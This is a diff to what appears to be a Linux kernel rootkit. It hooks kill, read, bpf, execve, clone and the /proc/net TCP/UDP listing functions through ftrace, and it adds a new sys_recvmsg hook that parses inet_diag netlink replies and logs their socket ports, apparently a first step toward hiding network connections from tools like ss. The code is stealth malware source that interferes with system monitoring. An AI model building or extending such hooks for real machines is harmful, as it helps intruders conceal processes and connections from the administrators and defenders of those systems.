@@ -30,8 +30,9 @@ sys64 real_m_exit_group;
 sys64 real_m_clone;
 sys64 real_m_kill;
 sys64 real_m_execve;
-sys64 real_m_bpf;
 sys64 real_m_read;
+sys64 real_m_bpf;
+sys64 real_m_recvmsg;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
@@ -378,12 +379,14 @@ static unsigned long _get_sys_addr(unsigned long addr)
 	return 0UL;
 }
 
+//XXX
+//long sys_bpf(int cmd, union bpf_attr *attr, unsigned int size);
 static asmlinkage long m_bpf(struct pt_regs *regs)
 {
 	long ret = 0;
 	union bpf_attr *attr = NULL;
-	struct kernel_syscalls *ks;
 	union bpf_attr __user *uattr;
+	struct kernel_syscalls *ks;
 	void *key = NULL, *value = NULL;
 	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
@@ -492,6 +495,85 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 
 out:
 	kv_mem_free(&key, &value, &attr);
+	return ret;
+}
+
+#include <linux/inet_diag.h>
+#include <linux/netlink.h>
+
+static asmlinkage long m_recvmsg(struct pt_regs *regs)
+{
+	struct iovec iov_kernel;
+	struct user_msghdr msg_kernel;
+	struct user_msghdr __user *umsg =
+		(struct user_msghdr __user *)PT_REGS_PARM2(regs);
+	long ret;
+	void *kbuf;
+	struct nlmsghdr *nlh;
+	size_t remaining_len;
+
+	ret = real_m_recvmsg(regs);
+
+	if (!umsg || !access_ok(umsg, sizeof(*umsg))) {
+		pr_err("Invalid user-space pointer for msghdr\n");
+		return ret;
+	}
+
+	// Copy user-space msghdr to us
+	if (copy_from_user(&msg_kernel, umsg, sizeof(msg_kernel))) {
+		pr_err("Failed to copy msghdr from user space\n");
+		return ret;
+	}
+
+	if (!msg_kernel.msg_iov ||
+	    !access_ok(msg_kernel.msg_iov, sizeof(struct iovec))) {
+		pr_err("Invalid or inaccessible iovec pointer\n");
+		return ret;
+	}
+
+	if (copy_from_user(&iov_kernel, msg_kernel.msg_iov,
+			   sizeof(iov_kernel))) {
+		pr_err("Failed to copy iovec from user space\n");
+		return ret;
+	}
+
+	if (!iov_kernel.iov_base ||
+	    !access_ok(iov_kernel.iov_base, iov_kernel.iov_len)) {
+		pr_err("Invalid or inaccessible iov_base pointer: %p\n",
+		       iov_kernel.iov_base);
+		return ret;
+	}
+
+	kbuf = kmalloc(iov_kernel.iov_len, GFP_KERNEL);
+	if (!kbuf) {
+		pr_err("Failed to allocate kernel buffer\n");
+		return ret;
+	}
+
+	// Copy the data from user-space
+	if (copy_from_user(kbuf, iov_kernel.iov_base, iov_kernel.iov_len)) {
+		pr_err("Failed to copy data from user space\n");
+		kfree(kbuf);
+		return ret;
+	}
+
+	// Iterate over each nlmsghdr in the buffer
+	nlh = (struct nlmsghdr *)kbuf;
+	remaining_len = iov_kernel.iov_len;
+
+	for (; NLMSG_OK(nlh, remaining_len);
+	     nlh = NLMSG_NEXT(nlh, remaining_len)) {
+		struct inet_diag_msg *idm = NLMSG_DATA(nlh);
+		int sport = ntohs(idm->id.idiag_sport);
+		int dport = ntohs(idm->id.idiag_dport);
+		prinfo("nlmsg_len: %u sport=%d dport=%d\n", nlh->nlmsg_len,
+		       sport, dport);
+
+		//XXX: check if need to handle attributes
+	}
+
+	kfree(kbuf);
+
 	return ret;
 }
 
@@ -1146,6 +1228,7 @@ static struct ftrace_hook ft_hooks[] = {
 	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
 	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
 	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
+	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
